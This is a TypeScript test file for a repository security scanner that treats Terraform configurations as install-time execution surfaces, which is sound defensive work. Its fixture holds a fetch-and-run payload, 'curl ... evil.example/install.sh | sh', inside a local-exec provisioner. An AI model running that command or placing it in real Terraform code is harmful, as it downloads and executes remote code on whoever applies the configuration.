import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function terraformFixture(): string {
  return [
    'resource "null_resource" "setup" {',
    '  provisioner "local-exec" {',
    `    command = "${PAYLOAD}"`,
    "  }",
    "}",
    "",
  ].join("\n");
}

test("a terraform configuration is scanned as an install surface", () => {
  // PRD section 8: the scan checks install and build scripts, and a scan
  // is incomplete when content that runs at install or execution time was
  // not covered. A provisioner runs its command at apply time, so a
  // Terraform configuration is execution content whatever its file name is.
  for (const path of ["main.tf", "infra/variables.tf", "modules/app/main.tf"]) {
    const inspection = inspected(path, terraformFixture());
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    expect(inspection.downloads).toEqual(["https://evil.example/install.sh"]);
  }
});

test("changing a terraform configuration changes the reviewed inventory", () => {
  const before = inspected("main.tf", 'resource "null_resource" "a" {}\n');
  const after = inspected(
    "main.tf",
    'resource "null_resource" "a" {}\nresource "null_resource" "b" {}\n',
  );
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("terraform variable values stay unclassified", () => {
  // A .tfvars file holds data, not commands: it must not become an
  // install surface, so the inventory does not become a blanket text scan.
  expect(surfacesOf("terraform.tfvars")).toEqual([]);
  expect(surfacesOf("prod.auto.tfvars")).toEqual([]);
});
